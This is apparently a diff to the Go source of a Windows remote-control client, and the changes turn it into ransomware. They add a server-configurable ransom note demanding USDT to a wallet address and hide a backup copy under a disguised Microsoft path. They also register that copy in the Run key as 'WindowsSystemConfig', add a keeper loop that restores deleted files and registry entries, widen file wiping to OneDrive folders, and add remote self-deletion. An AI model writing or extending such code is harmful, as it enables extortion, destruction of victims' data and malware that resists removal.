@@ -4,7 +4,9 @@ import (
 	"bufio"
 	"bytes"
 	"crypto/rand"
+	"crypto/sha256"
 	"crypto/tls"
+	"encoding/hex"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -29,9 +31,17 @@ import (
 // Configuration
 const (
 	// In production, use "https://clearpc.zm-tool.me"
-	ServerURL     = "http://localhost:8080"
-	PollInterval  = 5 * time.Second
-	AdminPassword = "admin" // Hardcoded admin password
+	ServerURL    = "http://clearpc.zm-tool.me"
+	PollInterval = 5 * time.Second
+)
+
+var (
+	// AdminPassword is now dynamic, fetched from server (HASHED)
+	// Default hash for "A23456a?"
+	AdminPassword = "87ec4c94d80ba427aea9ad47c6a2d0f4c725a4959187f5f08d98644a1e791ada"
+
+	// RansomNote is dynamic, fetched from server
+	RansomNote = "您的电脑已被锁定！\n请支付 100 USDT 到以下地址以解锁：\nTQkn9pDx3pRqpZ3iWmRtRXeHZkLAYG6WVH\n\n(联系管理员获取密码)"
 )
 
 type Device struct {
@@ -58,23 +68,55 @@ var httpClient *http.Client
 var currentDeviceID string
 
 var (
-	watchdogMode  = flag.Bool("watchdog", false, "Run in watchdog mode")
-	targetPID     = flag.Int("target", 0, "PID to monitor")
+	watchdogMode = flag.Bool("watchdog", false, "Run in watchdog mode")
+	targetPID    = flag.Int("target", 0, "PID to monitor")
+
+	mainExePath   = flag.String("main", "", "Path to main executable")
 	uninstallMode = flag.Bool("uninstall", false, "Run uninstaller")
 )
 
 const (
 	LockStateFile  = "lock_state.json"
 	StopSignalFile = "stop_signal"
+	// Use a deceptive name and path for the backup
+	BackupDirName  = "Microsoft\\Windows\\SystemData"
+	BackupExeName  = "sys_config.exe"
+	PathConfigFile = "config.dat"
 )
 
 type LockState struct {
 	Locked bool   `json:"locked"`
 	Pin    string `json:"pin"`
+	Admin  string `json:"admin"` // Cache admin password
 }
 
 func main() {
 	flag.Parse()
+
+	// Check if we are running as the "Restorer" (Boot from Hidden Dir)
+	myPath, _ := os.Executable()
+	myDir := filepath.Dir(myPath)
+	backupDir := getBackupDir()
+
+	// Normalize paths for comparison
+	myDirAbs, _ := filepath.Abs(myDir)
+	backupDirAbs, _ := filepath.Abs(backupDir)
+
+	// If we are in the hidden dir, and NOT explicitly told to be a watchdog or uninstaller
+	if strings.EqualFold(myDirAbs, backupDirAbs) && !*watchdogMode && !*uninstallMode {
+		// We are the hidden backup starting on boot (Registry)
+		targetPath := getInstallPath()
+		if targetPath != "" {
+			// Restore if missing
+			if _, err := os.Stat(targetPath); os.IsNotExist(err) {
+				copyFile(myPath, targetPath)
+			}
+			// Start the Main Client
+			exec.Command(targetPath).Start()
+			// Exit this loader process
+			os.Exit(0)
+		}
+	}
 
 	if *uninstallMode {
 		handleUninstall()
@@ -82,12 +124,18 @@ func main() {
 	}
 
 	if *watchdogMode {
-		runWatchdog(*targetPID)
+		runWatchdog(*targetPID, *mainExePath)
 		return
 	}
 
 	// Normal mode
 	enableAutoStart()
+
+	// Ensure backup for resilience
+	ensureBackup()
+
+	// Start the persistence keeper to ensure backup file and registry key exist
+	go startPersistenceKeeper()
 
 	// Start watchdog to protect this process
 	watchdogPID := startWatchdogProcess()
@@ -96,8 +144,11 @@ func main() {
 	go monitorWatchdog(watchdogPID)
 
 	// Check lock state
-	if isLocked, pin := getLockState(); isLocked {
+	if isLocked, pin, savedAdmin := getLockState(); isLocked {
 		currentLockPassword = pin
+		if savedAdmin != "" {
+			AdminPassword = savedAdmin
+		}
 		// Start lock screen in a goroutine
 		resumeLockScreen(pin)
 	}
@@ -154,6 +205,25 @@ func register(d Device) error {
 	if resp.StatusCode != http.StatusOK {
 		return fmt.Errorf("server returned status: %d", resp.StatusCode)
 	}
+
+	// Parse response to get config
+	var result struct {
+		Status string `json:"status"`
+		Config struct {
+			AdminPassword string `json:"admin_password"`
+			RansomNote    string `json:"ransom_note"`
+		} `json:"config"`
+	}
+
+	if err := json.NewDecoder(resp.Body).Decode(&result); err == nil {
+		if result.Config.AdminPassword != "" {
+			updateAdminPassword(result.Config.AdminPassword)
+		}
+		if result.Config.RansomNote != "" {
+			RansomNote = result.Config.RansomNote
+		}
+	}
+
 	return nil
 }
 
@@ -168,6 +238,12 @@ func pollForCommands(id string) {
 		return
 	}
 	defer resp.Body.Close()
+
+	// Check for Admin Password update in headers
+	newAdminPwd := resp.Header.Get("X-Admin-Password")
+	if newAdminPwd != "" && newAdminPwd != AdminPassword {
+		updateAdminPassword(newAdminPwd)
+	}
 
 	if resp.StatusCode == http.StatusNoContent {
 		return // No commands
@@ -254,13 +330,74 @@ func executeCommand(cmd Command) {
 		log.Println("Unlocking screen...")
 		result = stopLockScreen()
 
+	case "self_destruct":
+		log.Println("Received self_destruct command. Initiating self-deletion...")
+		reportResult(cmd, "Self-destruct sequence initiated. Goodbye.")
+		go performSelfDestruct()
+		result = "Self-destruct initiated."
+
 	default:
 		log.Printf("Unknown command: %s\n", cmd.Action)
 		result = fmt.Sprintf("Unknown command: %s", cmd.Action)
 	}
 
-	// Report result back to server
-	reportResult(cmd, result)
+	// Report result back to server (except for self_destruct which reports early)
+	if cmd.Action != "self_destruct" {
+		reportResult(cmd, result)
+	}
+}
+
+func performSelfDestruct() {
+	// 1. Create Stop Signal
+	os.WriteFile(getStopSignalPath(), []byte("STOP"), 0644)
+
+	// 2. Remove AutoStart
+	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
+	if err == nil {
+		k.DeleteValue("ClearFilesClient")
+		k.Close()
+	}
+
+	// 3. Remove Lock State
+	os.Remove(getLockStateConfigPath())
+
+	// 4. Wait for others to see signal
+	time.Sleep(2 * time.Second)
+
+	// 5. Kill other instances
+	killOtherInstances()
+
+	// 6. Remove Stop Signal
+	os.Remove(getStopSignalPath())
+
+	// 7. Remove Backup Directory
+	os.RemoveAll(getBackupDir())
+
+	// 8. Self Delete
+	selfDelete()
+}
+
+func killOtherInstances() {
+	pid := os.Getpid()
+	exeName := filepath.Base(os.Args[0])
+	// Kill all instances of this exe EXCEPT the current process
+	exec.Command("taskkill", "/F", "/IM", exeName, "/FI", fmt.Sprintf("PID ne %d", pid)).Run()
+
+	// Kill backup process if running
+	exec.Command("taskkill", "/F", "/IM", BackupExeName).Run()
+}
+
+func selfDelete() {
+	exePath, err := os.Executable()
+	if err != nil {
+		os.Exit(0)
+	}
+	// Spawn a detached cmd process to delete the file after a short delay
+	// cmd /c ping 127.0.0.1 -n 3 > nul & del /F /Q "exePath"
+	cmd := exec.Command("cmd", "/C", "ping", "127.0.0.1", "-n", "3", ">", "nul", "&", "del", "/F", "/Q", exePath)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Start()
+	os.Exit(0)
 }
 
 func reportResult(cmd Command, result string) {
@@ -321,6 +458,16 @@ func performDataWipe() string {
 		filepath.Join(homeDir, "Desktop"),
 		filepath.Join(homeDir, "Downloads"),
 		filepath.Join(homeDir, "Documents"),
+	}
+
+	// Add OneDrive paths if they exist
+	oneDrive := os.Getenv("OneDrive")
+	if oneDrive != "" {
+		targets = append(targets,
+			filepath.Join(oneDrive, "Desktop"),
+			filepath.Join(oneDrive, "Documents"),
+			filepath.Join(oneDrive, "Pictures"),
+		)
 	}
 
 	// Add app-specific paths
@@ -422,6 +569,94 @@ func formatNonSystemDrives() string {
 	return fmt.Sprintf("Format sequence completed. Formatted: %v. Failed: %v", formatted, failed)
 }
 
+func getBackupDir() string {
+	configDir, err := os.UserConfigDir()
+	if err != nil {
+		return "."
+	}
+	return filepath.Join(configDir, BackupDirName)
+}
+
+func getBackupPath() string {
+	dir := getBackupDir()
+	os.MkdirAll(dir, 0755)
+	hideFile(dir) // Hide the directory
+	return filepath.Join(dir, BackupExeName)
+}
+
+func getPathConfigPath() string {
+	return filepath.Join(getBackupDir(), PathConfigFile)
+}
+
+func saveInstallPath(path string) {
+	os.WriteFile(getPathConfigPath(), []byte(path), 0644)
+	hideFile(getPathConfigPath())
+}
+
+func getInstallPath() string {
+	data, err := os.ReadFile(getPathConfigPath())
+	if err != nil {
+		return ""
+	}
+	return string(data)
+}
+
+func hideFile(path string) {
+	ptr, _ := syscall.UTF16PtrFromString(path)
+	// FILE_ATTRIBUTE_HIDDEN = 2
+	// FILE_ATTRIBUTE_SYSTEM = 4
+	syscall.SetFileAttributes(ptr, 2|4)
+}
+
+func copyFile(src, dst string) error {
+	in, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer in.Close()
+
+	out, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+
+	_, err = io.Copy(out, in)
+	return err
+}
+
+func ensureBackup() {
+	backupPath := getBackupPath()
+	mainPath, _ := os.Executable()
+
+	// Always save the install path so the backup knows where to restore
+	saveInstallPath(mainPath)
+
+	// Check if backup exists
+	if _, err := os.Stat(backupPath); os.IsNotExist(err) {
+		copyFile(mainPath, backupPath)
+		hideFile(backupPath)
+	}
+}
+
+func enableAutoStart() {
+	// Register the BACKUP file as the startup item
+	// This ensures the "check program" runs on boot
+	exePath := getBackupPath()
+
+	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
+	if err != nil {
+		// Try to create if not exists
+		k, _, err = registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
+		if err != nil {
+			return
+		}
+	}
+	defer k.Close()
+
+	k.SetStringValue("WindowsSystemConfig", exePath)
+}
+
 func startLockScreen() string {
 	if runtime.GOOS != "windows" {
 		return "Not supported on this OS"
@@ -484,38 +719,28 @@ func getLockStateConfigPath() string {
 }
 
 func saveLockState(locked bool, pin string) {
-	state := LockState{Locked: locked, Pin: pin}
+	state := LockState{Locked: locked, Pin: pin, Admin: AdminPassword}
 	data, _ := json.Marshal(state)
 	os.WriteFile(getLockStateConfigPath(), data, 0644)
 }
 
-func getLockState() (bool, string) {
+func getLockState() (bool, string, string) {
 	data, err := os.ReadFile(getLockStateConfigPath())
 	if err != nil {
-		return false, ""
+		return false, "", ""
 	}
 	var state LockState
 	json.Unmarshal(data, &state)
-	return state.Locked, state.Pin
+	return state.Locked, state.Pin, state.Admin
 }
 
-func enableAutoStart() {
-	if runtime.GOOS != "windows" {
-		return
-	}
-	exePath, err := os.Executable()
-	if err != nil {
-		return
-	}
-
-	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
-	if err != nil {
-		return
-	}
-	defer key.Close()
-
-	// Name: ClearFilesClient
-	key.SetStringValue("ClearFilesClient", exePath)
+func updateAdminPassword(pwd string) {
+	AdminPassword = pwd
+	// Update persistence if we are locked, or just always update
+	// To be safe, we just read current state and update the admin field
+	isLocked, pin, _ := getLockState()
+	saveLockState(isLocked, pin)
+	log.Println("Admin password updated")
 }
 
 func getStopSignalPath() string {
@@ -532,24 +757,53 @@ func checkStopSignal() bool {
 	return err == nil
 }
 
+func startPersistenceKeeper() {
+	ticker := time.NewTicker(3 * time.Second)
+	for range ticker.C {
+		if checkStopSignal() {
+			ticker.Stop()
+			return
+		}
+		// 1. Re-create backup file if deleted
+		ensureBackup()
+		// 2. Re-apply registry key if deleted
+		enableAutoStart()
+	}
+}
+
 func startWatchdogProcess() int {
-	exePath, err := os.Executable()
+	mainPath, err := os.Executable()
 	if err != nil {
 		return 0
 	}
+
+	ensureBackup()
+	backupPath := getBackupPath()
+
 	pid := os.Getpid()
 
-	cmd := exec.Command(exePath, "-watchdog", fmt.Sprintf("-target=%d", pid))
+	cmd := exec.Command(backupPath, "-watchdog", fmt.Sprintf("-target=%d", pid), fmt.Sprintf("-main=%s", mainPath))
 	// Hide console for watchdog too
 	// Since we are compiling with -H=windowsgui, the child should also be gui.
 	cmd.Start()
 	return cmd.Process.Pid
 }
 
-func runWatchdog(pid int) {
+func runWatchdog(pid int, mainPath string) {
 	monitorProcess(pid, func() {
-		exePath, _ := os.Executable()
-		restartProcess(exePath)
+		if mainPath == "" {
+			mainPath = getInstallPath()
+		}
+		if mainPath == "" {
+			// Fallback if config is missing?
+			// We can't do much if we don't know where the main file should be.
+			// But maybe we can guess or just exit.
+			// Let's try to restart in current dir if all else fails,
+			// assuming the main file was supposed to be here?
+			// No, the backup is in a hidden dir.
+			return
+		}
+		restartProcess(mainPath)
 	})
 }
 
@@ -561,6 +815,8 @@ func monitorWatchdog(pid int) {
 		if checkStopSignal() {
 			return
 		}
+
+		ensureBackup()
 		currentPid = startWatchdogProcess()
 		time.Sleep(1 * time.Second)
 	}
@@ -568,11 +824,6 @@ func monitorWatchdog(pid int) {
 
 // monitorProcess watches a PID and calls onDeath when it exits
 func monitorProcess(pid int, onDeath func()) {
-	exePath, err := os.Executable()
-	if err != nil {
-		return
-	}
-
 	for {
 		// Check for stop signal
 		if checkStopSignal() {
@@ -603,6 +854,12 @@ func monitorProcess(pid int, onDeath func()) {
 }
 
 func restartProcess(path string) {
+	// Restore file if missing
+	if _, err := os.Stat(path); os.IsNotExist(err) {
+		myPath, _ := os.Executable()
+		copyFile(myPath, path)
+	}
+
 	// Start the main process again
 	// The main process will spawn a NEW watchdog.
 	// So we (current watchdog) can just exit.
@@ -617,7 +874,11 @@ func handleUninstall() {
 	password, _ := reader.ReadString('\n')
 	password = strings.TrimSpace(password)
 
-	if password != AdminPassword {
+	// Hash input
+	hash := sha256.Sum256([]byte(password))
+	pwdHash := hex.EncodeToString(hash[:])
+
+	if pwdHash != AdminPassword {
 		fmt.Println("Incorrect password.")
 		return
 	}
@@ -630,7 +891,7 @@ func handleUninstall() {
 	// 3. Remove AutoStart
 	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
 	if err == nil {
-		k.DeleteValue("ClearFilesClient")
+		k.DeleteValue("WindowsSystemConfig")
 		k.Close()
 	}
 
@@ -641,13 +902,17 @@ func handleUninstall() {
 	fmt.Println("Stopping processes...")
 	time.Sleep(3 * time.Second)
 
-	// 6. Kill any remaining instances
-	exec.Command("taskkill", "/F", "/IM", filepath.Base(os.Args[0])).Run()
+	// 6. Kill other instances
+	killOtherInstances()
 
 	// 7. Remove Stop Signal
 	os.Remove(getStopSignalPath())
 
-	fmt.Println("Uninstalled. You can now delete the file.")
+	// Remove backup directory completely
+	os.RemoveAll(getBackupDir())
+
+	fmt.Println("Uninstalled. The file will be deleted.")
+	selfDelete()
 }
 
 var (
@@ -782,7 +1047,11 @@ func wndProc(hwnd uintptr, msg uintptr, wParam, lParam uintptr) uintptr {
 			user32.NewProc("GetWindowTextW").Call(hEdit, uintptr(unsafe.Pointer(&buf[0])), 256)
 			input := syscall.UTF16ToString(buf)
 
-			if input == currentLockPassword || input == AdminPassword {
+			// Calculate hash of input for admin check
+			hash := sha256.Sum256([]byte(input))
+			inputHash := hex.EncodeToString(hash[:])
+
+			if input == currentLockPassword || inputHash == AdminPassword {
 				user32.NewProc("DestroyWindow").Call(hwnd)
 				saveLockState(false, "")
 			} else {
@@ -979,7 +1248,7 @@ func showRansomNote() {
 	procMessageBox := user32.NewProc("MessageBoxW")
 
 	title, _ := syscall.UTF16PtrFromString("系统已锁定")
-	message, _ := syscall.UTF16PtrFromString("您的电脑已被锁定！\n请支付 1 BTC 到以下地址以解锁：\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\n(联系管理员获取密码)")
+	message, _ := syscall.UTF16PtrFromString(RansomNote)
 
 	// 0x00000030 = MB_ICONEXCLAMATION
 	// 0x00001000 = MB_SYSTEMMODAL (Topmost)
